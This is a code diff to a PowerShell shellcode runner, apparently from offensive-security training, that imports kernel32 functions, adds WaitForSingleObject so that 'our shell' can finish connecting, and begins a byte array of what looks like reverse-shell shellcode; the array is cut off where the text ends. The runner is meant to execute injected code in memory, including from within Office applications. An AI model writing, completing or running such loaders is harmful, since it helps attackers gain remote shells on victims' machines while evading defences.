@@ -4,6 +4,9 @@
 # We can use the .NET Copy method from System.Runtime.InteropServices.Marshal
 # Be sure to execute this script with the 32-bit powershell if executing in a 
 # 32-bit application such as Office 2016.
+# We will also use the WaitSingleObject APU to pause the script to allow for
+# our shell to finish connecting before terminating the PS process.
+
 
 $Kernel32 = @"
 using System;
@@ -17,10 +20,15 @@ public class Kernel32 {
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint 
     dsStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
     IntPtr lpThreadId);
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+        UInt32 dwMilliseconds);
 }
 "@
 
 Add-Type $Kernel32
+
+[Kernel32]::WaitForSingleObject($thandle, [UInt32]"0xFFFFFFFF") # telling program to wait until we have exited our shell with 0xFFFFFFFF
 
 [Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,
 0x8b,0x52,0xc,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,
